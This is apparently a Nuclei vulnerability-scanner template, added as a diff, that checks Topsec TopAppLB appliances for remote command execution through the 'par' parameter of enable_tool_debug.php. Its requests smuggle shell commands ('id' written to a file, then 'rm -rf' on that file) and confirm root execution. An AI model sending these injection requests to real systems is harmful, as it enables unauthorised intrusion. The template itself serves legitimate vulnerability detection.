@@ -1,0 +1,50 @@
+id: topsec-topapplb-enable-tool-debug-rce
+
+info:
+  name: Topsec TopAppLB Enable Tool Debug RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Topsec_TopAppLB application delivery system /acc/tools/enable_tool_debug.php file diskname parameter remote command execution vulnerability, executable system commands, resulting in the system being hacked.
+  tags: rce
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-debug-file
+    raw:
+      - |
+        GET /acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1%27%20%7C%20id%20%3E%20vul2.txt%20%7C%27 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-rce
+    raw:
+      - |
+        GET /acc/tools/vul2.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "uid=0\\(root\\)"
+
+  - id: cleanup-debug-file
+    raw:
+      - |
+        GET /acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1%27%20%7C%20rm%20-rf%20vul2.txt%20%7C%27 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 200
